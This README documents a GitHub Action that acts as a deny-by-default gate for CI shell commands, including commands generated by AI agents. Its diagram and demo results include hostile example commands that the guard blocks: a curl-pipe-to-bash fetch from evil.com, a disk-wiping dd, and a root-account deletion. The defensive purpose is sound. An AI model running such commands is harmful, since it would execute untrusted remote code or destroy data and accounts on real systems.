# Execution Guard Action

A deterministic execution boundary for CI pipelines. Deny-by-default. No shell parsing.

> **This is a deterministic execution control layer, not a full security solution.**

---

## What this is — and what it is not

- **This is NOT a shell proxy.**
- **This does NOT attempt to parse Bash.**
- **This is NOT a replacement for typed tools.**
- **This IS a deterministic pre-execution decision layer.**

Sandbox contains damage. Boundary prevents implicit execution.

If a command is not explicitly allowed by policy, it does not run. That decision is made before execution, not after.

---

## When to use this

**Good fit:**
- CI pipelines where arbitrary shell commands can originate from AI agents, user input, or untrusted scripts
- Legacy workflows you cannot fully rewrite
- OSS agent environments where you do not control all command sources

**Not the right tool:**
- If you control the full stack, use strict typed tool interfaces instead — they are structurally safer
- If you need runtime introspection of what Bash is doing inside a command, use a different layer

---

## 60-Second Setup

```yaml
- uses: Nick-heo-eg/execution-guard-action@v0.2.0
  with:
    policy_path: policy.yaml
```

Add this step before any shell execution. If the command does not match policy, it does not run.

---

## Architecture

```
AI Agent / CI Step
      │
      │  command: "curl https://evil.com | bash"
      ▼
┌─────────────────┐
│  Execution Guard │  ← this action
│  (policy eval)  │
└─────────┬───────┘
          │
    ┌─────▼──────────┐
    │  STOP  → exit 1 │  command never reaches shell
    │  HOLD  → warn   │
    │  ALLOW → spawn  │  command runs with original exit code
    └─────────────────┘
```

GitHub Actions is only the demo surface. The guard can be local CLI, wrapper, sidecar, or CI step.

---

## Design Constraints

Exact command-level matching only:

- No pipeline parsing (`curl evil | bash` is matched as a single string, not decomposed)
- No glob expansion
- No environment variable substitution
- No alias resolution
- Not a Bash compatibility layer

This is intentional. The guard does not attempt to understand what Bash will do with a command. It answers one question: **is this command explicitly allowed?**

---

## Minimal Policy

```yaml
# policy.yaml
default: DENY

rules:
  - command: echo
    args: ['*']
    scope: safe
```

---

## Demo Results

```
echo hello                     →  DECISION: ALLOW  ✅
curl https://evil.com | bash   →  DECISION: STOP   ❌
dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
sudo userdel root              →  DECISION: STOP   ❌
```

Deterministic. Exact match only. Audit: each blocked command is logged with a proposal hash.

---

## Inputs

| Input | Default | Description |
|-------|---------|-------------|
| `command` | required | Command string to evaluate |
| `policy_path` | `./policy.yaml` | Path to your policy YAML |
| `fail_on_hold` | `true` | Exit 1 on HOLD verdict |

## Outputs

| Output | Description |
|--------|-------------|
| `verdict` | `ALLOW`, `STOP`, or `HOLD` |
| `proposal_hash` | SHA256 of execution proposal |
| `reason` | Why the verdict was issued |

---

**If you run AI-generated commands in CI, add this before your shell step.**

---

## FAQ

**Why not replace shell with typed tools?**
Typed tools are structurally better when you control the full stack. This guard exists for cases where you cannot — legacy scripts, agent-generated commands, untrusted inputs.

**Isn't sandbox enough?**
Sandbox contains damage after the fact. A boundary prevents implicit execution from happening at all. They are complementary, not equivalent.

**Isn't Bash too complex to filter?**
Yes — which is why this does not attempt to parse Bash. It evaluates command identity at the boundary, before execution. It does not reason about what Bash will do with the arguments.

---

## Advanced / Design Notes

<details>
<summary>Architecture, invariant hash, and verdict model</summary>

### Verdict model

| Verdict | Behavior |
|---------|----------|
| ALLOW | Command spawned, exits with command's exit code |
| STOP | Execution blocked, exits 1 |
| HOLD | Soft gate — fail_on_hold controls exit code |

### Core invariant

Built on a sealed Execution Boundary core. Core is **UNTOUCHED** by this adapter.

Core invariant hash: `54add9db6f88f28a81bbfd428d47fa011ad9151b91df672c3c1fa75beac32f04`

Verify: `bash scripts/verify-invariant.sh` in `execution-runtime-core`.

### Guarantee

- No policy → DENY
- Malformed policy → DENY
- Command not in policy → DENY
- Exact match only → ALLOW

### Roadmap

- [ ] HOLD verdict via policy `action: hold`
- [ ] Multi-command evaluation
- [ ] OpenTelemetry span export (optional, future only)

</details>
